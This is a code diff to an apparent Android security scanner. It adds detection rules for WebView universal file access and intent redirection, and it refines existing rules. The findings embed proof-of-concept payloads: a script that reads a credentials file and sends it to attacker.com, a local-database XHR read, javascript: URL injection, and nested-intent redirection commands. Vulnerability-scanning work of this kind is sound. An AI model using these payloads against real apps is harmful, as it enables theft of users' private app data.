@@ -47,10 +47,19 @@ class ExportedActivityRule(BaseRule):
             confidence = self._determine_confidence(activity['name'])
 
             # Generate exploit commands
+            pkg = self.apk_parser.get_package_name()
             exploit_cmds = [
-                f"adb shell am start -n {self.apk_parser.get_package_name()}/{activity['name']}",
-                f"adb shell am start -a android.intent.action.VIEW -n {self.apk_parser.get_package_name()}/{activity['name']}"
+                f"adb shell am start -n {pkg}/{activity['name']}",
             ]
+            # Only add VIEW action if this activity actually handles it
+            handles_view = any(
+                'android.intent.action.VIEW' in f.get('actions', [])
+                for f in activity.get('intent_filters', [])
+            )
+            if handles_view:
+                exploit_cmds.append(
+                    f"adb shell am start -a android.intent.action.VIEW -n {pkg}/{activity['name']}"
+                )
 
             finding = self.create_finding(
                 component_name=activity['name'],
@@ -101,13 +110,19 @@ class IntentToWebViewRule(BaseRule):
         taint_paths = self.taint_engine.get_paths_to_sink("loadUrl")
 
         for path in taint_paths:
+            # Extract real class name from dalvik method signature
+            # e.g. "Lio/pkg/MyActivity;->onCreate(...)V" → "io.pkg.MyActivity"
+            component = path.sink
+            if '->' in component:
+                component = component.split('->')[0].lstrip('L').rstrip(';').replace('/', '.')
+
             exploit_cmds = [
-                f"adb shell am start -n {self.apk_parser.get_package_name()}/.Activity --es url 'javascript:alert(1)'",
-                f"adb shell am start -n {self.apk_parser.get_package_name()}/.Activity --es url 'https://attacker.com'"
+                f"adb shell am start -n {self.apk_parser.get_package_name()}/{component} --es url 'javascript:alert(1)'",
+                f"adb shell am start -n {self.apk_parser.get_package_name()}/{component} --es url 'https://attacker.com'"
             ]
 
             finding = self.create_finding(
-                component_name=path.sink,
+                component_name=component,
                 confidence=Confidence.CONFIRMED if path.confidence == "CONFIRMED" else Confidence.LIKELY,
                 taint_path=self._format_taint_path(path),
                 exploit_commands=exploit_cmds,
@@ -427,5 +442,199 @@ class JavaScriptBridgeRule(BaseRule):
                 remediation="Remove @JavascriptInterface methods or validate origin. Use Chrome Custom Tabs instead.",
                 exploit_commands=["# Inject JavaScript", "javascript:Android.method(args)"]
             ))
+
+        return findings
+
+
+class WebViewFileAccessRule(BaseRule):
+    """Detect WebView with file:// cross-origin access enabled - CWE-200."""
+
+    rule_id = "EXP-036"
+    title = "WebView Universal File Access Enabled"
+    severity = Severity.CRITICAL
+    cwe = "CWE-200"
+    component_type = "webview"
+    description = (
+        "WebView has setAllowUniversalAccessFromFileURLs(true) or "
+        "setAllowFileAccessFromFileURLs(true), allowing file:// pages to read "
+        "arbitrary files from the device including app private data."
+    )
+    remediation = (
+        "Set setAllowUniversalAccessFromFileURLs(false) and "
+        "setAllowFileAccessFromFileURLs(false). These default to false on API 16+. "
+        "Never enable them in production."
+    )
+    references = [
+        "https://cwe.mitre.org/data/definitions/200.html",
+        "https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs(boolean)",
+    ]
+
+    def check(self) -> List[Finding]:
+        findings = []
+
+        if not self.callgraph:
+            return findings
+
+        pkg = self.apk_parser.get_package_name()
+
+        # Check both the universal access flag and the weaker file-to-file flag
+        checks = [
+            (
+                "setAllowUniversalAccessFromFileURLs",
+                Confidence.CONFIRMED,
+                Severity.CRITICAL,
+                "Allows any file:// page to read ALL files the app can access — "
+                "equivalent to a full same-origin policy bypass.",
+                [
+                    "# Load a crafted HTML file that reads app private data",
+                    f"adb shell am start -a android.intent.action.VIEW "
+                    f"-d 'file:///sdcard/steal.html' -n {pkg}/.WebViewActivity",
+                    "# steal.html content:",
+                    "# <script>fetch('file:///data/data/{pkg}/shared_prefs/creds.xml')"
+                    ".then(r=>r.text()).then(d=>location='https://attacker.com/?d='+btoa(d))</script>",
+                ]
+            ),
+            (
+                "setAllowFileAccessFromFileURLs",
+                Confidence.LIKELY,
+                Severity.HIGH,
+                "Allows file:// pages to read other file:// URIs — "
+                "an attacker can read any file the app has access to via a crafted local HTML page.",
+                [
+                    "# Load a crafted HTML that reads another local file",
+                    f"adb shell am start -a android.intent.action.VIEW "
+                    f"-d 'file:///sdcard/steal.html' -n {pkg}/.WebViewActivity",
+                    "# steal.html: <script>var x=new XMLHttpRequest();"
+                    "x.open('GET','file:///data/data/{pkg}/databases/app.db',false);"
+                    "x.send();alert(x.responseText)</script>",
+                ]
+            ),
+        ]
+
+        seen: set = set()
+        for api_name, confidence, severity, scenario, exploit_cmds in checks:
+            callers = self.callgraph.search_methods(api_name)
+            for caller_sig in callers:
+                if caller_sig in seen:
+                    continue
+
+                # Confirm the call passes `true` — check callees for a boolean true literal.
+                # Androguard doesn't expose argument values easily from the callgraph alone,
+                # so we flag all callers and note that manual verification is needed if
+                # the confidence is LIKELY.
+                seen.add(caller_sig)
+                class_name = (
+                    caller_sig.split("->")[0].strip("L").replace("/", ".").rstrip(";")
+                    if "->" in caller_sig else caller_sig
+                )
+
+                # Override severity per-finding since the two APIs have different severities
+                original_severity = self.severity
+                self.severity = severity
+                findings.append(self.create_finding(
+                    component_name=class_name,
+                    confidence=confidence,
+                    code_snippet=(
+                        f"webView.getSettings().{api_name}(true);  // DANGEROUS — remove this line"
+                    ),
+                    exploit_commands=exploit_cmds,
+                    exploit_scenario=scenario,
+                    api_level_affected="All (defaulted to false since API 16)",
+                ))
+                self.severity = original_severity
+
+        return findings
+
+
+class IntentRedirectionRule(BaseRule):
+    """Detect intent redirection — exported component forwards attacker-controlled intent - CWE-926."""
+
+    rule_id = "EXP-037"
+    title = "Intent Redirection (Privilege Escalation)"
+    severity = Severity.CRITICAL
+    cwe = "CWE-926"
+    component_type = "activity"
+    description = (
+        "An exported component retrieves a nested Intent from extras "
+        "(getParcelableExtra / getSerializableExtra) and passes it directly to "
+        "startActivity() / startService() without validation. An attacker can "
+        "supply an arbitrary Intent targeting internal components."
+    )
+    remediation = (
+        "Never start components using an Intent obtained from untrusted extras. "
+        "If forwarding is necessary, use an explicit allowlist of permitted target "
+        "components and strip dangerous flags (FLAG_GRANT_READ_URI_PERMISSION etc.)."
+    )
+    references = [
+        "https://cwe.mitre.org/data/definitions/926.html",
+        "https://blog.oversecured.com/Android-Intent-Redirection/",
+    ]
+
+    # Sources that extract a nested Intent from an incoming intent
+    _NESTED_INTENT_SOURCES = (
+        "getParcelableExtra",
+        "getSerializableExtra",
+        "getBundleExtra",
+    )
+
+    def check(self) -> List[Finding]:
+        findings = []
+
+        if not self.taint_engine:
+            return findings
+
+        pkg = self.apk_parser.get_package_name()
+
+        # Find taint paths from nested-intent sources to startActivity / startService
+        redirect_sinks = ["startActivity", "startService", "startForegroundService"]
+
+        for sink in redirect_sinks:
+            for path in self.taint_engine.get_paths_to_sink(sink):
+                # Only flag if the source involves extracting a nested Intent
+                if not any(src in path.source for src in self._NESTED_INTENT_SOURCES):
+                    continue
+
+                # Extract class name from dalvik sink signature
+                component = path.sink
+                if "->" in component:
+                    component = component.split("->")[0].lstrip("L").rstrip(";").replace("/", ".")
+
+                # Only flag if the component is an exported activity or service
+                all_components = (
+                    self.apk_parser.get_activities() + self.apk_parser.get_services()
+                )
+                is_exported = any(
+                    c["exported"] and c["name"] == component
+                    for c in all_components
+                )
+                if not is_exported:
+                    continue
+
+                findings.append(self.create_finding(
+                    component_name=component,
+                    confidence=Confidence.CONFIRMED if path.confidence == "CONFIRMED" else Confidence.LIKELY,
+                    taint_path=self._format_taint_path(path),
+                    code_snippet=(
+                        "// Vulnerable pattern:\n"
+                        "Intent nested = getIntent().getParcelableExtra(\"extra_intent\");\n"
+                        "startActivity(nested);  // attacker controls the target"
+                    ),
+                    exploit_commands=[
+                        f"# Launch exported activity with a nested intent targeting an internal component",
+                        f"adb shell am start -n {pkg}/{component} \\",
+                        f"  --ep extra_intent 'intent:#Intent;component={pkg}/.InternalActivity;"
+                        f"action=android.intent.action.MAIN;end'",
+                        f"# Or target a protected broadcast receiver",
+                        f"adb shell am start -n {pkg}/{component} \\",
+                        f"  --ep extra_intent 'intent:#Intent;component={pkg}/.AdminReceiver;end'",
+                    ],
+                    exploit_scenario=(
+                        f"Attacker sends an intent to exported {component} with a nested "
+                        f"Intent extra pointing to {pkg}'s internal components. The app "
+                        f"forwards it via {sink}(), granting the attacker access to "
+                        f"components that would otherwise be inaccessible."
+                    ),
+                    api_level_affected="All",
+                ))
 
         return findings
